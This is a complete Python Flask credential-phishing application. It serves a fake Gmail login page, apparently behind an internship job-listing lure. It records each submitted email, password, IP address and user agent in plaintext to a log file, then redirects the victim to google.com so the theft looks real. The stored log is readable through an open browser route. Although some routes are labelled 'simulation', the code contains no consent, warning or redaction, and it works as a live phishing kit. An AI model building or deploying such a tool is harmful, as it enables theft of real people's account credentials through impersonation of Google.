from flask import Flask, request, render_template, redirect
import os
from datetime import datetime

app = Flask(__name__)

# Folder and file to store captured credentials
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "phish_log.txt")

# Create logs folder if not already there
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# ---------- ROUTES ---------- #

# Home page (optional) - your internship job listing
@app.route('/')
def sim_home():
    return render_template("sim_home.html")

# Show the fake Gmail login page
@app.route('/simulate-gmail-login')
def fake_login():
    return render_template("login_gmail.html")

# Capture login form data and redirect to Gmail
@app.route('/capture-credentials', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Save the captured credentials to log file
    with open(LOG_FILE, 'a') as log:
        log.write(f"[{now}] IP: {ip} | Email: {email} | Password: {password} | UA: {user_agent}\n")

    # ✅ Redirect to real Gmail login (makes it look real)
    return redirect("https://www.google.com")

# View the simulation logs in browser
@app.route('/view-simulation-logs')
def view_logs():
    try:
        with open(LOG_FILE, 'r') as log:
            lines = log.readlines()
        return "<br>".join(lines)
    except FileNotFoundError:
        return "No logs captured yet."

# ---------- APP START ---------- #
if __name__ == '__main__':
    app.run(debug=True, port=5050)
